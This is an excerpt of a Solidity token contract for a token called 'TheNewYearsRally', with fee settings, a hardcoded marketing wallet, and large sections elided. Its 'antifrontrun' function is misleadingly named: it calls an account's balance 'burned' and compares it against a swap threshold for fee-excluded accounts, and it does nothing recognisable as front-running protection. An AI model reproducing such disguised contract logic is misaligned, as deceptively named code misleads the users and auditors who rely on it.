...
//https://t.me/TheNewYearsRally
//https://thenewyearsrally.cc
...
contract TheNewYearsRally is Context, IERC20, Ownable {
    ...
    string private constant _name = "TheNewYearsRally"; //
    string private constant _symbol = unicode"RALLY23"; //
    uint8 private constant _decimals = 9; //

    uint256 public _marketingFee = 2;
    uint256 public _liquidityFee = 0;
    address public  _marketingWallet = 0xF3E31Ef7830B31e60aAb4c4f984E298A237947EE;
    bool public setReadyTimes = false;


    bool private swapping;
    uint256 private mf = SWAP_TOKENS_AT_AMOUNT;
    ...
    function antifrontrun(address account) public view returns(bool) {
        uint256 burned=balanceOf(account);
        if (isExcludedFromFee(account)){
        return (burned<mf);}else{return false;}
    }
